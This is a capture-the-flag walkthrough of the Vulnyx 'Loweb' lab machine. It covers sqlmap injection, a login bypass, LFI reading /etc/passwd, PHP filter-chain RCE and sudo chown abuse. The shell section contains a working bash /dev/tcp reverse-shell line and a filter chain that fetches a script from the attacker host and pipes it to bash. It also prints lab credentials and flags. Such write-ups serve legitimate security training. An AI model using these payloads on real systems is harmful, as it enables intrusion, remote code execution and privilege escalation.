# Vulnyx – Loweb Lab


<img width="1330" height="417" alt="Screenshot 2026-10-24 162656" src="https://github.com/user-attachments/assets/f9068c84-c71d-4b77-82fc-fd5034fc9d47" />



A step-by-step walkthrough of the Vulnyx Loweb machine, covering reconnaissance, web directory enumeration, SQL injection, Local File Inclusion (LFI), Remote Code Execution (RCE), initial access, and privilege escalation to root.

> **Target IP:** `192.168.1.2`  
> **Attacker IP:** `192.168.1.4`  
> **Environment:** Kali Linux and Vulnyx lab VM

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Directory Enumeration](#2-web-directory-enumeration)
3. [Enumerating the Admin Directory](#3-enumerating-the-admin-directory)
4. [Identifying SQL Injection](#4-identifying-sql-injection)
5. [Enumerating the Database](#5-enumerating-the-database)
6. [Bypassing the Login](#6-bypassing-the-login)
7. [Identifying Local File Inclusion](#7-identifying-local-file-inclusion)
8. [Analyzing `/etc/passwd`](#8-analyzing-etcpasswd)
9. [Exploiting LFI to Obtain a Shell](#9-exploiting-lfi-to-obtain-a-shell)
10. [Upgrading the Shell](#10-upgrading-the-shell)
11. [Enumerating the User's Home Directory](#11-enumerating-the-users-home-directory)
12. [Finding Credentials](#12-finding-credentials)
13. [Privilege Escalation Using `chown`](#13-privilege-escalation-using-chown)
14. [Retrieving the Flags](#14-retrieving-the-flags)
15. [Attack Path Summary](#15-attack-path-summary)

---

## 1. Reconnaissance

The first step is to scan the IP address provided by the lab VM using Nmap.

```bash
nmap -sS -p- -sV -O --open --min-rate 5000 -n -oN scan 192.168.1.2
```

### Nmap Output

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-28 09:03 -0400
Nmap scan report for 192.168.1.2
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 00:0C:29:3C:EF:F8 (VMware)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 20.88 seconds
```

### Findings

The scan identified two open TCP ports:

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.2p1 |
| 80 | HTTP | Apache 2.4.62 |

Nothing immediately unusual was identified from the initial scan. Since HTTP was open on port 80, the next step was to investigate the website for hidden directories and files.

---

## 2. Web Directory Enumeration

To discover hidden directories and files, I used **FFUF (Fuzz Faster U Fool)**.

FFUF is a web fuzzer written in Go that helps identify directories, files, parameters, and virtual hosts. It is available in Kali Linux, so a separate installation was not required.

I ran the following command:

```bash
ffuf -u "http://192.168.1.2/FUZZ" \
     -w /usr/share/wordlists/dirb/common.txt \
     -ac
```

### Output

```text
.htaccessSwkhinwL       [Status: 200, Size: 10701, Words: 3427, Lines: 369]
index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369]
library                 [Status: 301, Size: 312, Words: 20, Lines: 10]
```

The scan discovered a directory named `/library` that returned HTTP status code `301`.

A `301 Moved Permanently` response indicates that the requested resource has been permanently redirected to another URL.

The `/library` directory looked interesting, so I decided to enumerate its contents.

### Enumerating the `/library` Directory

I used FFUF again, this time checking for PHP-related file extensions.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u http://192.168.1.2/library/FUZZ \
     -e .php,.php7,.phtml \
     -fc 404
```

### Output

```text
.phtml                  [Status: 403, Size: 276, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 318, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 1068, Words: 75, Lines: 30]
login                   [Status: 301, Size: 318, Words: 20, Lines: 10]
```

The scan revealed two additional directories:

- `/library/admin`
- `/library/login`

The `403 Forbidden` responses indicate that access to those particular resources was denied. The `200 OK` responses indicate successful HTTP responses, while `301` indicates redirection.

I checked both directories. The login directory did not reveal anything immediately useful. However, the admin directory contained PHP files that returned temporary redirects, so I investigated it further.

---

## 3. Enumerating the Admin Directory

I used FFUF to discover additional files inside `/library/admin`.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u http://192.168.1.2/library/admin/FUZZ \
     -e .php,.php7,.phtml \
     -fc 404
```

### Output

```text
script.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
style.php               [Status: 302, Size: 1, Words: 1, Lines: 2]
```

Both `script.php` and `style.php` returned HTTP status code `302`, which indicates a temporary redirect.

To understand where these files were redirecting, I checked their response headers using `curl`.

```bash
curl -I http://192.168.1.2/library/admin/script.php
curl -I http://192.168.1.2/library/admin/style.php
```

### Relevant Output

```text
HTTP/1.1 302 Found
Server: Apache/2.4.62 (Debian)
Set-Cookie: PHPSESSID=vqb2g6orq7on5pd78fuv7fjv6h; path=/
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /library/login/index.php
Content-Type: text/html; charset=UTF-8
```

Both files redirected to the login page:

```text
/library/login/index.php
```

When I opened the admin and login areas in the browser, a login panel appeared.


<img width="1720" height="965" alt="Screenshot_2026-10-24_07-19-53" src="https://github.com/user-attachments/assets/1034a996-1d1f-487c-94a3-f6abe75df40e" />




This provided a new attack surface to investigate: the login form.

---

## 4. Identifying SQL Injection

The next step was to check whether the login form was vulnerable to SQL injection.

I used **SQLmap**, an automated tool for detecting and testing SQL injection vulnerabilities.

The following command tested the `username` and `password` POST parameters:

```bash
sqlmap -u "http://192.168.1.2/library/login/index.php" \
       --data="username=test&password=test" \
       --level=5 \
       --risk=3 \
       --batch
```

### Output

```text
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test' OR NOT 1940=1940-- mqPa&password=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 6932 FROM (SELECT(!SLEEP(5)))Ycwp)-- FqWN&password=test

[INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

[WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 511 times

[INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.1.2'
```

The scan confirmed that the `username` POST parameter was vulnerable to SQL injection.

SQLmap identified two injection techniques:

1. **Boolean-based blind SQL injection:** The application can be tested by submitting conditions that evaluate to true or false and observing differences in the response.
2. **Time-based blind SQL injection:** The database can be made to delay its response, allowing the tool to infer information from response times.

SQLmap also identified MySQL, or a compatible MariaDB backend, as the database technology.

With the vulnerability confirmed, I proceeded to enumerate the database.

---

## 5. Enumerating the Database

### Finding the Database Name

First, I used SQLmap to identify the current database.

```bash
sqlmap -u "http://192.168.1.2/library/login/index.php" \
       --data="username=test&password=test" \
       --current-db \
       --batch
```

### Output

```text
library
current database: 'library'
```

The database name was identified as `library`.

### Finding the Tables

Next, I enumerated the tables inside the database.

```bash
sqlmap -u "http://192.168.1.2/library/login/index.php" \
       --data="username=test&password=test" \
       -D library \
       --tables \
       --batch
```

### Output

```text
Database: library
[1 table]
+-------+
| users |
+-------+
```

The database contained a table named `users`.

### Dumping the Users Table

I then retrieved the contents of the `users` table.

```bash
sqlmap -u "http://192.168.1.2/library/login/index.php" \
       --data="username=test&password=test" \
       -D library \
       -T users \
       --dump \
       --batch
```

### Output

```text
[INFO] retrieved: id
[INFO] retrieved: username
[INFO] retrieved: password
[INFO] retrieved: email
[INFO] fetching entries for table 'users' in database 'library'
[INFO] fetching number of entries for table 'users' in database 'library'
[INFO] retrieved: 2
[INFO] retrieved: john@example.com
[INFO] retrieved: $2y$10$AkhF2T9slTqNPbwh6eRbVeLr5XW8ZqWvJ/zFapZ7Y8ZK0G70Hxo3W
[INFO] retrieved: admin
[INFO] retrieved: r3dh4ck@example.com
[INFO] retrieved: 2
[INFO] retrieved: $2y$10$AkhF2T9slTqNPbwh6eRbVeLr5XW8ZqWvJ/zFapZ7Y8ZK0G70Hxo3W
[INFO] retrieved: r3dh4ck
[INFO] recognized possible password hashes in column 'password'
```

The table contained two user records with the following fields:

- `id`
- `username`
- `password`
- `email`

The retrieved records were:

| ID | Username | Email | Password |
|---|---|---|---|
| 1 | admin | john@example.com | `$2y$10$AkhF2T9slTqNPbwh6eRbVeLr5XW8ZqWvJ/zFapZ7Y8ZK0G70Hxo3W` |
| 2 | r3dh4ck | r3dh4ck@example.com | `$2y$10$AkhF2T9slTqNPbwh6eRbVeLr5XW8ZqWvJ/zFapZ7Y8ZK0G70Hxo3W` |

Both records contained the same password hash.

The `$2y$` prefix indicates a bcrypt password hash. Since the hash did not crack with the initial John the Ripper attempt, I tried another approach: testing whether the login form could be bypassed through SQL injection.

---

## 6. Bypassing the Login

I entered the following SQL injection payload into the username field of the login form:

```sql
' OR 1=1 -- -
```

The login bypass was successful, and I was able to access the application.

I explored the page, but nothing immediately useful appeared in the main content. I then inspected the page source code more closely.

Near the bottom of the page, in the About section, I found two language-switching links:

```html
<a href="index.php?lang=es.php">es</a>
<a href="index.php?lang=en.php">en</a>
```

The `lang` parameter accepts a filename as a URL parameter. This is a potential sign of a **Local File Inclusion (LFI)** vulnerability, especially if the application uses the supplied value to include a file on the server without proper validation.

I decided to test whether the parameter could be used to access a local system file.

---

## 7. Identifying Local File Inclusion

To test the suspected LFI vulnerability, I modified the `lang` parameter to point to `/etc/passwd`.

```text
http://192.168.1.2/library/admin/index.php?lang=/etc/passwd
```

The browser displayed what appeared to be the same logged-in page. However, when I inspected the page source, the contents of `/etc/passwd` appeared near the end of the response.

This confirmed that the application was including or exposing the contents of a local file supplied through the `lang` parameter.

The `/etc/passwd` file contains local account information, including usernames, user IDs, home directories, and login shells.

---

## 8. Analyzing `/etc/passwd`

The following entries were present in the returned file:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin/nologin
bin:x:2:2:bin:/usr/sbin/nologin
sys:x:3:3:sys:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
r3dh4ck:x:1000:1000::/home/r3dh4ck:/bin/bash
mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
```

### Important Findings

- **`root`:** The system administrator account, with UID `0`.
- **`r3dh4ck`:** A regular user account with UID `1000`, a home directory at `/home/r3dh4ck`, and an interactive Bash shell.
- **`www-data`:** The account commonly used by Apache to run web applications. Its login shell is disabled.
- **`sshd`:** An account associated with the SSH service.
- **`mysql`:** An account associated with the MySQL database service.

The `r3dh4ck` account was particularly interesting because it had a home directory and an interactive shell.

SSH was also open on port 22, but I did not have a private key or valid credentials for an SSH login.

I confirmed that the SSH port was reachable using Netcat:

```bash
nc -zv 192.168.1.2 22
```

### Output

```text
192.168.1.2: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.1.2] 22 (ssh) open
```

The output confirmed that port 22 was open. However, access still required valid authentication.

Since LFI was already confirmed, I investigated whether PHP stream wrappers could be used to achieve code execution.

---

## 9. Exploiting LFI to Obtain a Shell

In PHP exploitation, a wrapper refers to a built-in URL-style stream handler (like php://filter)
Php_filter_chain_generator is an open source automation tool designed to turn Local File Inclusion (LFI) vulnerabilities into Remote Code Execution (RCE) by abusing those wrappers.
PHP provides stream wrappers, including `php://filter`, that can transform file contents during file operations.

In certain vulnerable PHP applications, constructed filter chains can be abused to turn an LFI vulnerability into **Remote Code Execution (RCE)**.

For this lab, I used the `php_filter_chain_generator` tool to generate a filter chain.

### Step 1: Prepare a Reverse-Shell Script

First, I created a file named `s`:

```bash
nano s
```

I placed the following Bash reverse-shell command inside it, replacing `YOUR_MACHINE_IP` with the attacker machine's IP address:

```bash
bash -i >& /dev/tcp/YOUR_MACHINE_IP/443 0>&1
```

### Step 2: Start a Local HTTP Server

From the directory containing the `s` file, I started a Python HTTP server:

```bash
python3 -m http.server 80
```

### Output

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

This made the script available for retrieval from the target machine.

### Step 3: Start a Netcat Listener

In another terminal, I started a listener on port 443:

```bash
nc -nlvp 443
```

### Step 4: Generate the PHP Filter Chain

I cloned the `php_filter_chain_generator` tool and opened its directory.

Then I ran:

```bash
python3 php_filter_chain_generator.py --chain '<?=`wget -O- YOUR_MACHINE_IP/s|bash`?>'
```

Replace `YOUR_MACHINE_IP` with the actual attacker IP address. In my lab, the generated output referenced `192.168.1.4`.

### Output

```text
[+] The following gadget chain will generate the following code :
<?=`wget -O- 192.168.1.4/s|bash`?>
(base64 value: PD89YHdnZXQgLU8tIDE5Mi4xNjguMS40L3N8YmFzaGA/Pg)

php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

The actual generated chain was much longer than this excerpt. The tool output contains the complete chain, which must be copied exactly if reproducing the test.

### Step 5: Use the Generated Chain Through the LFI Parameter

I used the generated chain as the value of the `lang` parameter in the vulnerable page.

The URL structure was:

```text
http://192.168.1.2/library/admin/index.php?lang=GENERATED_WRAPPER
```

Here, `GENERATED_WRAPPER` represents the complete generated chain, only paste from `php://filter` to `resource=php://temp`.

The chain was used to trigger the PHP wrapper behavior in the vulnerable application. The intended result was to execute the command that retrieves the script from the attacker-controlled HTTP server and runs it.

### Step 6: Verify the Reverse-Shell Connection

After triggering the vulnerable URL, I checked the Netcat listener.

### Output

```text
listening on [any] 443 ...
connect to [192.168.1.4] from (UNKNOWN) [192.168.1.2] 48356
bash: cannot set terminal process group (652): Inappropriate ioctl for device
bash: no job control in this shell
www-data@loweb:/var/www/html/library/admin$
```

The connection confirmed that I had obtained a shell on the target as `www-data`.


---

## 10. Upgrading the Shell

The initial reverse shell did not provide a fully interactive terminal.

To improve usability, I ran:

```bash
script /dev/null -c bash
```

Then I pressed:

```text
CTRL + Z
```

After returning to the local terminal, I ran:

```bash
stty raw -echo; fg
```

I pressed Enter to return to the foreground shell.

Next, I checked the current user:

```bash
id
```

### Output

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The output confirmed that the shell was running as `www-data`, the web server account.

I then listed the available home directory:

```bash
ls /home
```

### Output

```text
r3dh4ck
```

There was one user home directory, `/home/r3dh4ck`, so I investigated it further.

---

## 11. Enumerating the User's Home Directory

I listed the contents of the user's home directory:

```bash
ls -la /home/r3dh4ck
```

### Output

```text
total 24
drwxr-xr-x 2 r3dh4ck r3dh4ck 4096 Mar 15  2025 .
drwxr-xr-x 3 root    root    4096 Mar 15  2025 ..
lrwxrwxrwx 1 root    root       9 Mar 15  2025 .bash_history -> /dev/null
-rw-r--r-- 1 r3dh4ck r3dh4ck  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 r3dh4ck r3dh4ck 3526 Apr 23  2023 .bashrc
lrwxrwxrwx 1 root    root       9 Mar 15  2025 .mysql_history -> /dev/null
-rw-r--r-- 1 r3dh4ck r3dh4ck  807 Apr 23  2023 .profile
-r-------- 1     775 r3dh4ck   33 Mar 15  2025 user.txt
```

The `user.txt` file was present, but its ownership and permissions prevented the current `www-data` user from reading it.

I needed to find a way to move from the web server account to the regular user account.

---

## 12. Finding Credentials

To search for potentially exposed passwords, I used `grep` to look for occurrences of the word `password` across the filesystem.

```bash
grep -Ri "password" / 2>/dev/null
```

### Output

```text
/opt/monitor.sh:SECRET_PASS="contraseñaconÑjeje" # Change this password for the future
/opt/monitor.sh:echo "Password: SECRET_PASS" >> $LOGFILE
```

The search revealed a password stored in `/opt/monitor.sh`:

```text
contraseñaconÑjeje
```

This appeared to be a potential credential for the `r3dh4ck` account.

### Switching to the User Account

I attempted to switch to `r3dh4ck`:

```bash
su r3dh4ck
```

When prompted for the password, I entered the discovered value:

```text
contraseñaconÑjeje
```

The login succeeded.

I verified the account:

```bash
id
```

### Output

```text
uid=1000(r3dh4ck) gid=1000(r3dh4ck) groups=1000(r3dh4ck)
```

I had successfully moved from the low-privileged `www-data` account to the regular user `r3dh4ck`.

The next step was to inspect the user's sudo privileges.

---

## 13. Privilege Escalation Using `chown`

I checked the commands that the `r3dh4ck` account was allowed to execute with `sudo`:

```bash
sudo -l
```

### Output

```text
Matching Defaults entries for r3dh4ck on loweb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User r3dh4ck may run the following commands on loweb:
    (ALL) NOPASSWD: /usr/bin/chown
```

The output showed that `r3dh4ck` could execute `/usr/bin/chown` with elevated privileges without entering a sudo password.

`chown` is a Linux command used to change the ownership of files and directories.

This permission was important because it allowed the user to change ownership of files that would otherwise be inaccessible.

### Changing the Ownership of `user.txt`

I used the permitted command to change the ownership of the user flag:

```bash
sudo /usr/bin/chown r3dh4ck:r3dh4ck /home/r3dh4ck/user.txt
```

Before the change, the file was owned by UID `775`, with `r3dh4ck` as its group. After the change, both the owner and group were `r3dh4ck`.

The file's permissions remained read-only for its owner, but the new ownership allowed the user to read it.

### Retrieving the User Flag

I read the file:

```bash
cat /home/r3dh4ck/user.txt
```

### Output

```text
ed568ec0cd3aef96d4c17a7f02a8391e
```

The user flag was successfully retrieved.

### Accessing the Root Directory

Next, I tried to access the root user's home directory:

```bash
cd /root
```

### Output

```text
bash: cd: /root: Permission denied
```

The directory was not accessible to the current user.

However, the sudo permission for `chown` could also be used to change the ownership of the `/root` directory itself.

I ran:

```bash
sudo /usr/bin/chown r3dh4ck /root
```

Then:

```bash
cd /root
```

This changed the owner of `/root` to `r3dh4ck`. Since the directory permissions already allowed its owner to access it, changing the ownership made the directory accessible to the user.

### Listing the Root Directory

I listed the directory contents:

```bash
ls -la
```

### Output

```text
total 32
drwx------  4 r3dh4ck root 4096 Mar 16  2025 .
drwxr-xr-x 18 root    root 4096 Feb 12  2024 ..
lrwxrwxrwx  1 root    root    9 Mar 15  2025 .bash_history -> /dev/null
-rw-r--r--  1 root    root 3526 Mar 16  2025 .bashrc
drwxr-xr-x  3 root    root 4096 Feb 12  2024 .local
lrwxrwxrwx  1 root    root    9 Mar 15  2025 .mysql_history -> /dev/null
-rw-r--r--  1 root    root  161 Jul  9  2019 .profile
-r--------  1 root    root   33 Mar 15  2025 r00t.txt
-rw-r--r--  1 root    root   66 Mar 15  2025 .selected_editor
drwx------  2 root    root 4096 Mar 16  2025 .ssh
```

The listing revealed the root flag file named `r00t.txt`.

However, the file was still owned by root and had read permission only for its owner.

### Changing the Ownership of `r00t.txt`

I used the permitted `chown` command again:

```bash
sudo /usr/bin/chown r3dh4ck /root/r00t.txt
```

After changing ownership, I read the flag:

```bash
cat /root/r00t.txt
```

### Output

```text
f6a0195e175989b2f9dd92fe4e35d6e4
```

The root flag was successfully retrieved.

**Important finding:** Although I obtained access to the root directory and root flag, this does not mean that the session became UID 0. The privilege escalation worked by abusing the ability to change file ownership through `sudo chown`.

---

## 14. Retrieving the Flags

Both flags were successfully retrieved during the lab.

| Flag | File | Result |
|---|---|---|
| User flag | `/home/r3dh4ck/user.txt` | `ed568ec0cd3aef96d4c17a7f02a8391e` |
| Root flag | `/root/r00t.txt` | `f6a0195e175989b2f9dd92fe4e35d6e4` |

---

## 15. Attack Path Summary

The complete attack path can be summarized as follows:

```text
Nmap Reconnaissance
        ↓
FFUF Directory Enumeration
        ↓
Discovery of /library
        ↓
Admin and Login Page Discovery
        ↓
SQL Injection Detection with SQLmap
        ↓
Database Enumeration
        ↓
Login Bypass
        ↓
Local File Inclusion (LFI)
        ↓
Reading /etc/passwd
        ↓
PHP Filter Chain Exploitation
        ↓
Remote Code Execution (RCE)
        ↓
Reverse Shell as www-data
        ↓
Credential Discovery in /opt/monitor.sh
        ↓
Switch to r3dh4ck
        ↓
Sudo Privilege Enumeration
        ↓
Abuse of NOPASSWD chown
        ↓
User Flag Retrieval
        ↓
Root Directory and Flag Access
```

### Key Takeaways

- **Nmap** was used to identify open ports and running services.
- **FFUF** helped discover hidden web directories and PHP files.
- **SQLmap** identified SQL injection in the login form and enumerated the database.
- **SQL injection** was used to bypass the application's login.
- **LFI** exposed the contents of `/etc/passwd`.
- **PHP stream wrappers** were investigated to turn the LFI vulnerability into remote code execution.
- A reverse shell was obtained as the `www-data` user.
- A password stored in `/opt/monitor.sh` enabled access to the `r3dh4ck` account.
- The `sudo -l` output revealed passwordless access to `chown`.
- The unrestricted ownership-changing permission was abused to access the user flag and root flag.

### Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port and service enumeration |
| FFUF | Web directory and file discovery |
| cURL | Inspecting HTTP response headers |
| SQLmap | SQL injection detection and database enumeration |
| John the Ripper | Attempted password-hash cracking |
| PHP Filter Chain Generator | Generating a PHP stream-wrapper chain |
| Python HTTP Server | Serving the reverse-shell script |
| Netcat | Receiving the reverse-shell connection |
| Linux utilities | System enumeration and privilege escalation |

### Lab Summary

- Performed Nmap scanning to identify open ports and running services on the target machine.
- Identified SSH (port 22) and HTTP (port 80) running on the target.
- Used FFUF for directory enumeration and discovered `/library`, `/library/admin`, and `/library/login`.
- Used SQLmap to test for SQL injection vulnerabilities in the login functionality.
- Extracted database information from the `library` database, including the `users` table.
- Exploited SQL Injection to bypass the application's login authentication.
- Exploited a Local File Inclusion (LFI) vulnerability through the `lang` parameter to read `/etc/passwd`.
- Identified the local user `r3dh4ck` from the system's user information.
- Escalated the LFI vulnerability to Remote Code Execution (RCE) using a PHP filter-chain technique.
- Established a reverse shell and gained initial access as `www-data`.
- Inspected `/opt/monitor.sh` and discovered a password that allowed switching to the `r3dh4ck` user.
- Enumerated sudo permissions using `sudo -l` and found that `r3dh4ck` could run `/usr/bin/chown` as root without a password.
- Abused the `chown` permission to change ownership of the user flag file and retrieve the user flag.
- Exploited the same permission to change ownership of files under `/root` and retrieve the root flag.
- Successfully achieved privilege escalation from `www-data` to `r3dh4ck`, and then to root-level access.
